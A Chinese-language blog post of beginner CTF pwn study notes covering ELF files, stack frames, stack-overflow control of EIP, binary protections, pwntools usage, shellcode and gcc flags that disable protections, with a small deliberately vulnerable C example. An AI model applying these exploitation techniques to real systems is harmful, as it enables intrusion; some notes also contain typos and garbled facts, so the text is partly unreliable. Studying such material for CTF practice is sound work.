<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>pwn探索--大杂烩 | 幻境</title><meta name="author" content="yub"><meta name="copyright" content="yub"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="pwn的核心：二进制漏洞的利用和挖掘研究层次：编译成机器码的二进制程序的漏洞二进制程序实际为可执行文件linux系统下ELF&#x3D;windows系统下EXE文件一次简单的hack  CTF中pwn攻击脚本思路： 1.pwn程序&#x2F;服务器（必不可少滴）开端——&gt;from pwn import*2.使用python中pwn tools用remote函数打开远端需要攻击的服务器端口3">
<meta property="og:type" content="article">
<meta property="og:title" content="pwn探索--大杂烩">
<meta property="og:url" content="https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/index.html">
<meta property="og:site_name" content="幻境">
<meta property="og:description" content="pwn的核心：二进制漏洞的利用和挖掘研究层次：编译成机器码的二进制程序的漏洞二进制程序实际为可执行文件linux系统下ELF&#x3D;windows系统下EXE文件一次简单的hack  CTF中pwn攻击脚本思路： 1.pwn程序&#x2F;服务器（必不可少滴）开端——&gt;from pwn import*2.使用python中pwn tools用remote函数打开远端需要攻击的服务器端口3">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://thumbs.dreamstime.com/b/%E5%8A%A8%E6%BC%AB%E8%83%8C%E6%99%AF%E5%A5%87%E5%B9%BB%E6%8F%92%E5%9B%BE%E6%B8%B8%E6%88%8F%E7%8E%AF%E5%A2%83%E7%AB%A5%E4%B9%A6%E4%BB%99%E5%A2%83%E6%99%AF%E8%A7%82%E6%8F%92%E5%9B%BE-270943592.jpg">
<meta property="article:published_time" content="2023-08-31T16:00:00.000Z">
<meta property="article:modified_time" content="2023-09-01T13:37:37.334Z">
<meta property="article:author" content="yub">
<meta property="article:tag" content="pwn,知识碎片">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://thumbs.dreamstime.com/b/%E5%8A%A8%E6%BC%AB%E8%83%8C%E6%99%AF%E5%A5%87%E5%B9%BB%E6%8F%92%E5%9B%BE%E6%B8%B8%E6%88%8F%E7%8E%AF%E5%A2%83%E7%AB%A5%E4%B9%A6%E4%BB%99%E5%A2%83%E6%99%AF%E8%A7%82%E6%8F%92%E5%9B%BE-270943592.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://yubut.github.io/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'pwn探索--大杂烩',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2023-09-01 21:37:37'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="幻境" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">10</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="not-home-page" id="page-header" style="background-image: url('https://thumbs.dreamstime.com/b/%E5%8A%A8%E6%BC%AB%E8%83%8C%E6%99%AF%E5%A5%87%E5%B9%BB%E6%8F%92%E5%9B%BE%E6%B8%B8%E6%88%8F%E7%8E%AF%E5%A2%83%E7%AB%A5%E4%B9%A6%E4%BB%99%E5%A2%83%E6%99%AF%E8%A7%82%E6%8F%92%E5%9B%BE-270943592.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="幻境"><span class="site-name">幻境</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pwn探索--大杂烩</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-08-31T16:00:00.000Z" title="发表于 2023-09-01 00:00:00">2023-09-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-09-01T13:37:37.334Z" title="更新于 2023-09-01 21:37:37">2023-09-01</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">二进制安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="pwn探索--大杂烩"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>pwn的核心：二进制漏洞的利用和挖掘<br>研究层次：编译成机器码的二进制程序的漏洞二进制程序实际为可执行文件<br>linux系统下ELF&#x3D;windows系统下EXE文件<br><strong>一次简单的hack</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307002535708.png" alt="image-20230307002535708"></p>
<p>CTF中pwn攻击脚本思路：</p>
<p>1.pwn程序&#x2F;服务器（必不可少滴）开端——&gt;from pwn import*<br>2.使用python中pwn tools用remote函数打开远端需要攻击的服务器端口<br>3.进行链接<br>4.构造恶意数据<br>5.发送恶意数据<br>6.使用交互函数（io.interactive（））获取flag</p>
<h5 id="程序的编译与链接"><a href="#程序的编译与链接" class="headerlink" title="程序的编译与链接"></a><strong>程序的编译与链接</strong></h5><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206225702913.png" alt="image-20230206225702913"></p>
<p>linux借助文件头进行识别!（用vim打开可查看源码–&gt;%!xxd可查看十六进制表示）<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206230237084.png" alt="image-20230206230237084"></p>
<h5 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a><strong>编译过程</strong></h5><p>ls指list file即列出文件；可用ll查看文件详细内容。<br>gcc兼具编译器和汇编器的功能。<br>ctrl+alt+t 启动shell</p>
<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206231832031.png" alt="image-20230206231832031" style="zoom:150%;" />

<p>Linux环境下执行可执行文件<br>!xdd%-r 还原文件<br>rm a.out 删除<br>.&#x2F;a.out 是linux&#x2F;unix环境下gcc编译源代码(c&#x2F;c++)并连来接产生的默认执行文件名。.&#x2F;a.out表示当前目录下的a.out文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206232441503.png" alt="image-20230206232441503"></p>
<p>链接<br>动态链接：printf的代码到动态链接库里；<br>静态链接：printf中的代码直接写好在对应文件中<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206235815274.png" alt="image-20230206235815274"><br><strong>文件权限不够时如何处理得到shell</strong><br>下以python3为例</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208112405419.png" alt="image-20230208112405419"></p>
<p>mv命令：用户可以使用mv命令来为文件或目录改名或将文件由一个目录移入另一个目录中。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208141609541.png" alt="image-20230208141609541"></p>
<p>段用来标注进程、印象代码段权限。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208142032344.png" alt="image-20230208142032344"></p>
<p>.&#x2F;时才被读入内存<br>cache越大（M存储），cpu速度越快。</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208151435139.png" alt="image-20230208151435139"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208152953051.png" alt="image-20230208152953051"></p>
<p>实模式下运行（易受到攻击）</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161344724.png" alt="image-20230208161344724"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161302543.png" alt="image-20230208161302543"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162239886.png" alt="image-20230208162239886"></p>
<p>十六进制转二进制</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162610999.png" alt="image-20230208162610999"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164349628.png" alt="image-20230208164349628"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164650781.png" alt="image-20230208164650781"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170556987.png" alt="image-20230208170556987"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170832516.png" alt="image-20230208170832516"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208172413117.png" alt="image-20230208172413117"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208173923251.png" alt="image-20230208173923251"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208173818672.png" alt="image-20230208173818672"></p>
<p>C语言函数栈帧<br>栈帧：记录一个函数此时的状态信息<br>函数的栈底由EBP或RBP保存<br>函数的栈顶由ESP或RSP保存</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209094759828.png" alt="image-20230209094759828"></p>
<p>32位视图<br>子函数所用参数保存在父函数栈帧的末尾<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209100855874.png" alt="image-20230209100855874"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209101728223.png" alt="image-20230209101728223"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102340553.png" alt="image-20230209102340553"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102615915.png" alt="image-20230209102615915"></p>
<p>push ebp保持父函数栈底的空间<br>sum函数调用完后需要恢复main函数的信息，即在调用sum函数前需将mian函数栈底压入。<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209103333679.png" alt="image-20230209103333679"></p>
<p>栈的栈顶一定是当前执行函数所属的栈帧。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209104000217.png" alt="image-20230209104000217"></p>
<p>无需舍弃只需标记为不需使用值即可——&gt;扩大esp到ebp处（避开局部变量存储空间）<br><strong>注意：此过程中变化为对应值的地址存储在ebp中——&gt;对应值存储在ebp中</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209105139584.png" alt="image-20230209105139584"></p>
<p>ebp减小一个字长；esp加一个字长。通过return指令将return address弹出保存在eap（指令寄存器）中<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209110221569.png" alt="image-20230209110221569"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209110919361.png" alt="image-20230209110919361"></p>
<p>call指令自带保存返回地址。<br>leave：将esp ebp放于同一位置后popebp。<br>pop总是将esp指向的值对应的1字长数据传入到目标位置</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209112610898.png" alt="image-20230209112610898"></p>
<p><strong>缓冲区溢出中</strong> <strong>栈溢出控制程序流核心：</strong><br>当子函数返回父函数时会将<em>Ruturn Adress</em>中的值返回到PC寄存器eip（32位）中，当eip中值写入目标值的地址，既可<em>完成程序执行流的控制</em>。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230216235806404.png" alt="image-20230216235806404"></p>
<p>举例演示：<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219153353227.png" alt="image-20230219153353227"></p>
<pre><code class="c">#include&lt;stdio.h&gt;
int main()
&#123;
   char str[8];
   read (0,str,24);
   retrun 0;
&#125;
</code></pre>
<p>此时产生segmentation fault（段错误）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219154052743.png" alt="image-20230219154052743"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230219154202756.png" alt="image-20230219154202756"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219161736349.png" alt="image-20230219161736349"></p>
<p>安全保护措施（拿到二进制文件之后先检查）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219165330509.png"></p>
<p><strong>注意</strong>：<em>出现gets函数必有栈溢出！</em>strart函数无法F5（编写时已用汇编代码实现）<br>vulnerable——&gt;可怜受害者函数捏~</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002608337.png" alt="image-20230221002608337"></p>
<p>ctrl+A后：可看C和汇编比较<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002832185.png" alt="image-20230221002832185"></p>
<p>ctrl+s–&gt;保存<br>(Fn+)shift+F12-&gt;打开字符串界面（ASCII范围内的字符串）<br>打开目标文件得关键句逐层剖析反汇编get完整main体-&gt;end<br>pwntools:nc转到问题变量本体<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160248520.png" alt="image-20230221160248520"></p>
<p>CTF建议：pip2+pip3均安装<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160924626.png" alt="image-20230221160924626">+<strong>代理地址可进行安装</strong>vi</p>
<p>拿到题目——&gt;先拿到本地shell——&gt;pwntools攻击——&gt;io本地切换为远程（脚本不变）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221162513214.png" alt="image-20230221162513214"></p>
<p>链接：process()-&gt;本地；remote（）—&gt;远程<br>函数：<br>io.recvline() 接收一行字符串；           io.recv（）接收多行字符串<br>io.send() <strong>注意：函数内部只能为字节流（即为二进制表示）</strong><br>io.send(p32(0)+b” ╰(<em>°▽°</em>)╯——&gt;表示bite对象”)<br>io.sendline()——&gt;一直读取直到\0或\n;<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165139013.png" alt="image-20230221165139013"></p>
<p>nc tools地址 ❗❗❗flag隐藏在其中❗❗❗<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165745894.png" alt="image-20230221165745894"></p>
<p>python3开  remote(“ip”,端口)<br>特殊控制符\r——&gt; 输出当前行后持续进行清空<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171244473.png" alt="image-20230221171244473"></p>
<p>base64工具（pwntools工具）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171442165.png" alt="image-20230221171442165"></p>
<p>❗BASE64:包含大写字母（A-Z）,小写字母（a-z），数字（0-9）以及+&#x2F; 一般带&#x3D;&#x3D;<br>❗BASE32:只有大写字母（A-Z）和数字234567 一般带&#x3D;&#x3D;&#x3D;<br>❗BASE16即为16进制<br><strong>当ASCll用Base加密达不到所对应的位数的时候用&#x3D;号补齐</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221234220854.png" alt="image-20230221234220854"></p>
<blockquote>
<p>cd “你想要进的目录” &#x2F;&#x2F;当目录名称中含有空格、中文或其它<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/112715?fromModule=lemma_inlink">特殊字符</a>时请用<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8F%8C%E5%BC%95%E5%8F%B7/10758658?fromModule=lemma_inlink">双引号</a>包括</p>
<p>以下是最常用的几个目录的写法：</p>
<p>&#x2F; 代表<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%A0%B9%E7%9B%AE%E5%BD%95/6061330?fromModule=lemma_inlink">根目录</a></p>
<p>. 当前目录</p>
<p>.. 上级目录</p>
<p>~ 当前用户的默认工作目录</p>
<p>目录可以省略不写， 与cd ~ 有相同的效果</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222002023021.png" alt="image-20230222002023021"></p>
<p>关闭标准输入输出的缓冲区 使得其中内容可以立马显示出来 ctrl+#调小字体<br>下断点方式：pwndbg中b *+一个地址 或者b + 一个函数<br>先下断点后run  gdb中运行输入首字母即可  例：n——&gt;步过    s——&gt;standin<br>下断点：b（breakpoint）  * +地址&#x2F;函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222191527599.png" alt="image-20230222191527599"></p>
<p>此时可修改部分为buffer（8字节）即eax到ebp部分（16大小）覆盖时需+4（覆盖ebp）<br>持续向下写<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075312799.png" alt="image-20230223075312799">找到后门函数system 注：可不是次次这么便宜的哦🤣<br>syetem返回字符串&#x3D;在shell中直接执行字符串 pwd：打印工作目录<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075541707.png" alt="image-20230223075541707"></p>
<p>使得vualable return到shell即可<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png" alt="image-20230223103831511"></p>
<p>p（pack）对数据进行打包变为字符型数据 ； 例：p32（0x8048522）打包为32bite位字符</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png" alt="image-20230223104016114"></p>
<p>gcc：Linux环境下的一款编译器。<br>ctrl+d 退出python交互环境!<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112513513.png" alt="image-20230223112513513"><br>bss默认栈可执行<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230411152517155.png" alt="image-20230411152517155"><br>关闭随机化（ASLR）</p>
<pre><code>-fro-stack-protector 关闭canary
-z exexstack 打开栈的可执行权限
-no-pie 关闭pie（程序编译时打开pie 将地址随机化为无关代码 即随机化elf文件）
-g 带上调试信息 调试时可以看见源代码（ret2stack.c未删除情况下）
-o 输出目标文件
</code></pre>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412200146471.png" alt="image-20230412200146471">chmod +x 给权限<br>shellcode(偏移+返回地址)</p>
<p>地址空间随机化&lt;——操作系统实现  可输入0检查ASLR是否关闭<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223115046186.png" alt="image-20230223115046186"></p>
<p>动态链接库看为1 地址随机分配 栈同（偏移值随机地址未知）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png" alt="image-20230223232443609"></p>
<p>bss用来存放全局变量  可读可写可执行 shellcode返回到bss<br>shellcode返回栈区由于aslr的保护不可得到所需栈地址，返回bss即可</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png" alt="image-20230224081202824"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224081246465.png" alt="image-20230224081246465"></p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112708517.png" alt="image-20230223112708517"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223113034773.png" alt="image-20230223113034773"></p>
<p>在pwn里，保护一共是四种分别是RELRO、Stack、NX、PIE。<br>1.RELRO（ReLocation Read-Only）：分为两种情况，第一种情况是Partial RELRO，这种情况是部分开启堆栈地址随机化，got表可写，第二种，Full RELRO是全部开启，got表不可写，Got表是全局偏移表，里面包含的是外部定义的符号相应的条目的数据段中，PLT表，是过程链接表&#x2F;内部函数表，linux延迟绑定，但是最后还是要连接到Got，PLT表只是为一个过渡的作用。<br>2.Stack（canary）：这个保护其实就是在你调用的函数的时候，在栈帧中插入一个随机数，在函数执行完成返回之前，来校验随机数是否被改变，来判断是否被栈溢出，这个我们也俗称为canary（金丝雀），栈保护技术。<br>3.NX（no execute）：为栈不可知性，也就是栈上的数据不可以当作代码区执行的作用,NX打开说明栈上已经给出全部可用的system（）、”&#x2F;bin&#x2F;sh”，不可自行写入。<br>4.PIE（Position Independent Executable）：PIE的中文叫做，地址无关可执行文件，是针对.text（代码段），.data（数据段），.bss（未初始化全局变量段）来做的保护，正常每一次加载程序，加载地址是固定的，但是PIE保护开启，每次程序启动的时候都会变换加载地址。</p>
<p>context.arch &#x3D; ‘“amch64”——&gt;将位机器码转为64位<br>vmmap显示虚拟内存的分布<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224125905589.png" alt="image-20230224125905589"></p>
<p>32位 1字长&#x3D;4bite 64位 1字长 &#x3D; 8bite push栈向上增长pop向下增长（减小）<br>leave执行：1.将esp归位至ebp位  2.pop ebp将previous ebp中的值存放到ebp中 3.ebp返回父函数栈底<br>esp自动+1字长（执行pop）<br>return的作用：将当前函数栈顶中的值pop返回到eip寄存器中 程序正在执行的地址变成return address<br>return address中的值存放到eip中 eip返回到上一个函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226153916098.png" alt="image-20230226153916098"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226154515139.png" alt="image-20230226154515139"></p>
<p>pwndbg的好处捏~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226155524945.png" alt="image-20230226155524945"><br>自动编写payload（默认结果为x86下32bite大小) print（shellcraft.sh（) )</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230226155734820.png" alt="image-20230226155734820"></p>
<p>asm将汇编码转变为机器码后发送至远程内存虚拟空间的某个位置<br>l.just(x，y)从左向右，左端数据不变对右边的数据不断进行填充 x：填充的数据长度 y：填充内容<br>cat.flag.txt 得到flag内容<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226162609326.png" alt="image-20230226162609326"></p>
<p>关闭aslr指令。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230306232744633.png" alt="image-20230306232744633"></p>
